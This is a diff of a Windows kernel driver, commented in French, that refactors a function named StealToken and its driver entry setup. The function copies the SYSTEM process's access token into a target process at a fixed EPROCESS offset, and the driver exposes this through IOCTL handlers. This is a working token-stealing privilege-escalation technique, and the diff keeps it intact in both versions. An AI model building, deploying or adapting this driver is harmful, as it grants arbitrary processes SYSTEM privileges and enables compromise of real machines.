@@ -26,18 +26,15 @@ VOID StealToken(_In_ ULONG TargetPid)
         return;
     }
 
-    {
-        PULONG_PTR systemTokenField = (PULONG_PTR)((ULONG_PTR)systemProcess + OFFSET_TOKEN);
-        PULONG_PTR targetTokenField = (PULONG_PTR)((ULONG_PTR)targetProcess + OFFSET_TOKEN);
-        ULONG_PTR systemTokenRaw = *systemTokenField;
+    PULONG_PTR systemTokenField = (PULONG_PTR)((ULONG_PTR)systemProcess + OFFSET_TOKEN);
+    PULONG_PTR targetTokenField = (PULONG_PTR)((ULONG_PTR)targetProcess + OFFSET_TOKEN);
 
-        DbgPrint("Steal: token System brut=0x%p masque=0x%p\n",
-                 (PVOID)systemTokenRaw,
-                 (PVOID)(systemTokenRaw & EX_FAST_REF_MASK));
+    DbgPrint("Steal: token System brut=0x%p masque=0x%p\n",
+             (PVOID)*systemTokenField,
+             (PVOID)(*systemTokenField & EX_FAST_REF_MASK));
 
-        *targetTokenField = systemTokenRaw;
-        DbgPrint("Steal: token copie vers PID %lu\n", TargetPid);
-    }
+    *targetTokenField = *systemTokenField;
+    DbgPrint("Steal: token copie vers PID %lu\n", TargetPid);
 
     ObDereferenceObject(targetProcess);
     ObDereferenceObject(systemProcess);
@@ -108,8 +105,8 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
         return status;
     }
 
-    DriverObject->MajorFunction[IRP_MJ_CREATE]         = StealCreateClose;
-    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = StealCreateClose;
+    DriverObject->MajorFunction[IRP_MJ_CREATE] = StealCreateClose;
+    DriverObject->MajorFunction[IRP_MJ_CLOSE] = StealCreateClose;
     DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = StealDispatchIoControl;
     DriverObject->DriverUnload = StealUnload;
     deviceObject->Flags |= DO_BUFFERED_IO;
